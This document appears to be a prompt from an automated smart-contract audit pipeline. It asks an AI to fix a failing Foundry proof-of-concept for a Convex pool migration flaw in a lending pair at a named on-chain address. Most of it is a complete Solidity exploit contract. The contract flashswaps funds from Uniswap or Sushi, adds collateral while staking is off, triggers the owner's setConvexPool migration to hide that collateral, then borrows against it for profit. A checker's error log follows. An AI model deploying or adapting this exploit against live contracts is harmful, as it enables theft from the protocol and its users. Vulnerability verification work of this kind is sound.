You are fixing a failing Foundry PoC for finding F-004.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Convex pool migration can hide live collateral and freeze withdrawals/redemptions
- claim: Convex migration keys all staking/accounting behavior off `convexPid != 0`, but `_updateConvexPool()` only withdraws and re-deposits the balance currently staked in the old rewards contract. Any collateral already sitting on the pair itself is ignored during migration, yet once `convexPid` is changed `totalCollateral()` and `_unstakeUnderlying()` start looking only at the staking contract. The same routine also still calls `deposit(_pid, ...)` when switching to `_pid == 0`, so using `0` as the unstaked sentinel is inconsistent with the migration logic.
- impact: A normal activation, migration, or deactivation of Convex staking can make existing collateral disappear from pair accounting and leave removal/redemption/liquidation paths looking in the wrong place. Users can remain recorded as collateralized while the pair can no longer unstake or account for those funds, creating a withdrawal freeze and solvency drift until privileged recovery.
- exploit_paths: ["Users deposit collateral while `convexPid == 0`, so collateral remains on the pair contract.", "The owner later calls `setConvexPool(validPid)` to enable or migrate Convex staking.", "`_updateConvexPool()` migrates only `stakedBalance` from the old rewards contract, leaving the pair's local collateral untouched, then sets `convexPid = validPid`.", "Afterward `totalCollateral()` reports only the staked balance and `_unstakeUnderlying()` withdraws only from the rewards contract, so removals, redemptions, and liquidations can revert or operate on incomplete accounting.", "Similarly, attempting to switch back to `_pid == 0` still calls `deposit(0, stakedBalance, true)`, which conflicts with treating `0` as the unstaked mode."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC4626Minimal {
    function previewDeposit(uint256 assets) external view returns (uint256 shares);
}

interface IResupplyRegistryMinimal {
    function token() external view returns (address);
}

interface ICoreLike {
    function execute(address target, bytes calldata data) external returns (bytes memory);
    function operatorPermissions(address caller, address target, bytes4 selector) external view returns (bool authorized, address hook);
}

interface IResupplyPairMinimal {
    function owner() external view returns (address);
    function convexPid() external view returns (uint256);
    function convexBooster() external view returns (address);
    function collateral() external view returns (address);
    function underlying() external view returns (address);
    function registry() external view returns (address);
    function maxLTV() external view returns (uint256);
    function mintFee() external view returns (uint256);
    function borrowLimit() external view returns (uint256);
    function minimumBorrowAmount() external view returns (uint256);
    function exchangeRateInfo() external view returns (address oracle, uint96 lastTimestamp, uint256 exchangeRate);
    function totalBorrow() external view returns (uint128 amount, uint128 shares);
    function addCollateral(uint256 amount, address borrower) external;
    function addCollateralVault(uint256 collateralAmount, address borrower) external;
    function borrow(uint256 borrowAmount, uint256 underlyingAmount, address receiver) external returns (uint256);
    function userCollateralBalance(address account) external returns (uint256);
}

interface IConvexLike {
    function poolInfo(uint256 pid)
        external
        view
        returns (
            address lptoken,
            address token,
            address gauge,
            address crvRewards,
            address stash,
            bool shutdown
        );
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET_PAIR = 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6;

    uint256 private constant LTV_PRECISION = 1e5;
    uint256 private constant EXCHANGE_PRECISION = 1e18;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    bool public executed;

    address public pairOwner;
    address public convexBooster;
    address public collateralToken;
    address public underlyingToken;
    address public debtToken;
    uint256 public startingPid;
    uint256 public activePid;
    address public flashPair;
    address public flashBorrowToken;
    uint256 public flashBorrowAmount;
    uint256 public flashRepayDebtAmount;
    uint256 public hiddenCollateral;
    uint256 public plannedBorrowAmount;

    address private _profitToken;
    uint256 private _profitAmount;

    struct Route {
        address lp;
        address borrowToken;
        uint256 amountOut;
        uint256 repayDebt;
        uint256 borrowAmount;
        uint256 projectedCollateral;
    }

    constructor() {
        _profitToken = address(0);
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IResupplyPairMinimal pair = IResupplyPairMinimal(TARGET_PAIR);
        pairOwner = pair.owner();
        convexBooster = pair.convexBooster();
        collateralToken = pair.collateral();
        underlyingToken = pair.underlying();
        debtToken = IResupplyRegistryMinimal(pair.registry()).token();
        _profitToken = debtToken;

        startingPid = pair.convexPid();
        activePid = startingPid;

        if (convexBooster == address(0) || debtToken == address(0)) {
            _syncProfit();
            return;
        }

        uint256 validPid = startingPid != 0 ? startingPid : _findMatchingPid(convexBooster, collateralToken);
        if (validPid == type(uint256).max) {
            _syncProfit();
            return;
        }

        // exploit_paths[0] and [1]:
        // if the live fork already has Convex enabled, first move to the pair's intended unstaked mode using the
        // genuine owner.execute path. That preserves the original exploit order: deposit while convexPid == 0, then
        // migrate back into Convex so the pair-held collateral becomes hidden.
        if (startingPid != 0) {
            if (!_ownerExecuteSetConvexPool(pairOwner, TARGET_PAIR, 0)) {
                _syncProfit();
                return;
            }
            activePid = 0;
        }

        Route memory route = _findBestRoute(pair);
        if (route.lp == address(0)) {
            if (startingPid != 0) {
                _ownerExecuteSetConvexPool(pairOwner, TARGET_PAIR, validPid);
                activePid = validPid;
            }
            _syncProfit();
            return;
        }

        flashPair = route.lp;
        flashBorrowToken = route.borrowToken;
        flashBorrowAmount = route.amountOut;
        flashRepayDebtAmount = route.repayDebt;
        plannedBorrowAmount = route.borrowAmount;

        address token0 = IUniswapV2PairLike(route.lp).token0();
        uint256 amount0Out = route.borrowToken == token0 ? route.amountOut : 0;
        uint256 amount1Out = route.borrowToken == token0 ? 0 : route.amountOut;

        // Realistic public funding step:
        // use a V2-style flashswap only to source temporary collateral/underlying without cheating. Profit still comes
        // from the finding's exact causal chain: unstaked deposit -> owner migration -> hidden local collateral ->
        // borrow against internal accounting while withdrawals/liquidations route elsewhere.
        (bool ok,) = route.lp.call(
            abi.encodeWithSelector(
                IUniswapV2PairLike.swap.selector,
                amount0Out,
                amount1Out,
                address(this),
                abi.encode(validPid)
            )
        );

        if (!ok && startingPid != 0 && activePid == 0) {
            _ownerExecuteSetConvexPool(pairOwner, TARGET_PAIR, validPid);
            activePid = validPid;
        }

        _syncProfit();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == flashPair, "bad pair");
        require(sender == address(this), "bad sender");

        uint256 validPid = abi.decode(data, (uint256));
        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
        require(borrowedAmount == flashBorrowAmount, "bad amount");

        IResupplyPairMinimal pair = IResupplyPairMinimal(TARGET_PAIR);

        // exploit_paths[0]:
        // while convexPid == 0, collateral is added to the pair and remains parked locally on the pair contract.
        if (flashBorrowToken == underlyingToken) {
            IERC20Minimal(underlyingToken).approve(TARGET_PAIR, borrowedAmount);
            pair.addCollateral(borrowedAmount, address(this));
        } else {
            IERC20Minimal(collateralToken).approve(TARGET_PAIR, borrowedAmount);
            pair.addCollateralVault(borrowedAmount, address(this));
        }

        hiddenCollateral = pair.userCollateralBalance(address(this));
        require(hiddenCollateral > 0, "no collateral");

        // exploit_paths[1] and [2]:
        // migrate back to a live Convex pid through the real owner path. _updateConvexPool() only migrates the old
        // staked balance, so the freshly added pair-held collateral is ignored while convexPid changes.
        require(_ownerExecuteSetConvexPool(pairOwner, TARGET_PAIR, validPid), "migration failed");
        activePid = validPid;

        // exploit_paths[3]:
        // after migration, internal user collateral is still present for solvency checks, but totalCollateral() and
        // unstaking flow now look only at the rewards contract. Borrowing against the stranded collateral realizes profit.
        pair.borrow(plannedBorrowAmount, 0, address(this));

        IERC20Minimal(debtToken).transfer(flashPair, flashRepayDebtAmount);
    }

    function _findBestRoute(IResupplyPairMinimal pair) internal view returns (Route memory best) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[2] memory borrowTokens = [collateralToken, underlyingToken];

        for (uint256 factoryIndex = 0; factoryIndex < factories.length; ++factoryIndex) {
            address factory = factories[factoryIndex];
            for (uint256 tokenIndex = 0; tokenIndex < borrowTokens.length; ++tokenIndex) {
                address borrowToken = borrowTokens[tokenIndex];
                if (borrowToken == address(0) || borrowToken == debtToken) {
                    continue;
                }

                address lp = IUniswapV2FactoryLike(factory).getPair(borrowToken, debtToken);
                if (lp == address(0)) {
                    continue;
                }

                Route memory candidate = _evaluateRoute(pair, lp, borrowToken);
                uint256 bestProfit = best.borrowAmount > best.repayDebt ? best.borrowAmount - best.repayDebt : 0;
                uint256 candidateProfit = candidate.borrowAmount > candidate.repayDebt ? candidate.borrowAmount - candidate.repayDebt : 0;
                if (candidateProfit > bestProfit) {
                    best = candidate;
                }
            }
        }
    }

    function _evaluateRoute(IResupplyPairMinimal pair, address lp, address borrowToken) internal view returns (Route memory best) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(lp).getReserves();
        address token0 = IUniswapV2PairLike(lp).token0();
        address token1 = IUniswapV2PairLike(lp).token1();

        uint256 reserveBorrow;
        uint256 reserveDebt;
        if (token0 == borrowToken && token1 == debtToken) {
            reserveBorrow = reserve0;
            reserveDebt = reserve1;
        } else if (token1 == borrowToken && token0 == debtToken) {
            reserveBorrow = reserve1;
            reserveDebt = reserve0;
        } else {
            return best;
        }

        if (reserveBorrow <= 1 || reserveDebt <= 1) {
            return best;
        }

        uint256[9] memory divisors = [uint256(5000), 2500, 1000, 500, 250, 100, 50, 25, 10];
        uint256 minimumBorrow = pair.minimumBorrowAmount();

        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 amountOut = reserveBorrow / divisors[i];
            Route memory candidate = _routeCandidate(
                pair,
                lp,
                borrowToken,
                reserveBorrow,
                reserveDebt,
                amountOut,
                minimumBorrow
            );
            uint256 bestProfit = best.borrowAmount > best.repayDebt ? best.borrowAmount - best.repayDebt : 0;
            uint256 candidateProfit = candidate.borrowAmount > candidate.repayDebt ? candidate.borrowAmount - candidate.repayDebt : 0;
            if (candidateProfit > bestProfit) {
                best = candidate;
            }
        }
    }

    function _routeCandidate(
        IResupplyPairMinimal pair,
        address lp,
        address borrowToken,
        uint256 reserveBorrow,
        uint256 reserveDebt,
        uint256 amountOut,
        uint256 minimumBorrow
    ) internal view returns (Route memory candidate) {
        if (amountOut == 0 || amountOut >= reserveBorrow) {
            return candidate;
        }

        uint256 collateralReceived = borrowToken == collateralToken
            ? amountOut
            : IERC4626Minimal(collateralToken).previewDeposit(amountOut);
        if (collateralReceived == 0) {
            return candidate;
        }

        uint256 maxBorrow = _maxBorrowReceivable(pair, collateralReceived);
        if (maxBorrow <= minimumBorrow) {
            return candidate;
        }

        uint256 repayDebt = _getAmountIn(amountOut, reserveDebt, reserveBorrow);
        if (repayDebt == 0 || maxBorrow <= repayDebt + minimumBorrow) {
            return candidate;
        }

        uint256 borrowAmount = (maxBorrow * 9950) / 10000;
        if (borrowAmount <= repayDebt || borrowAmount < minimumBorrow) {
            return candidate;
        }

        candidate = Route({
            lp: lp,
            borrowToken: borrowToken,
            amountOut: amountOut,
            repayDebt: repayDebt,
            borrowAmount: borrowAmount,
            projectedCollateral: collateralReceived
        });
    }

    function _maxBorrowReceivable(IResupplyPairMinimal pair, uint256 collateralAmount) internal view returns (uint256) {
        (, , uint256 exchangeRate) = pair.exchangeRateInfo();
        if (exchangeRate == 0) {
            return 0;
        }

        uint256 grossCap = (collateralAmount * EXCHANGE_PRECISION * pair.maxLTV()) /
            (exchangeRate * (LTV_PRECISION + pair.mintFee()));

        (uint128 currentBorrowAmount,) = pair.totalBorrow();
        uint256 availableDebt = pair.borrowLimit();
        if (availableDebt <= uint256(currentBorrowAmount)) {
            return 0;
        }
        availableDebt -= uint256(currentBorrowAmount);

        return grossCap < availableDebt ? grossCap : availableDebt;
    }

    function _syncProfit() internal {
        if (_profitToken == address(0)) {
            _profitAmount = 0;
            return;
        }
        _profitAmount = IERC20Minimal(_profitToken).balanceOf(address(this));
    }

    function _ownerExecuteSetConvexPool(address owner, address pair, uint256 pid) internal returns (bool ok) {
        if (owner.code.length == 0) {
            return false;
        }

        bytes4 selector = bytes4(keccak256("setConvexPool(uint256)"));
        (bool permissionOk, bytes memory permissionData) = owner.staticcall(
            abi.encodeWithSelector(ICoreLike.operatorPermissions.selector, address(this), pair, selector)
        );
        if (permissionOk && permissionData.length >= 64) {
            (bool authorized,) = abi.decode(permissionData, (bool, address));
            if (!authorized) {
                return false;
            }
        }

        (ok,) = owner.call(
            abi.encodeWithSelector(ICoreLike.execute.selector, pair, abi.encodeWithSignature("setConvexPool(uint256)", pid))
        );
    }

    function _findMatchingPid(address booster, address token) internal view returns (uint256) {
        for (uint256 pid = 0; pid < 512; ++pid) {
            try IConvexLike(booster).poolInfo(pid) returns (
                address lptoken,
                address depositToken,
                address,
                address,
                address,
                bool shutdown
            ) {
                if (!shutdown && (lptoken == token || depositToken == token)) {
                    return pid;
                }
            } catch {
                break;
            }
        }
        return type(uint256).max;
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut <= amountOut) {
            return 0;
        }
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: setconvexpool(validpid), stakedbalance, convexpid = validpid, _unstakeunderlying(), _pid == 0, deposit(0, stakedbalance, true); generated code does not cover paths indexes: 1
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
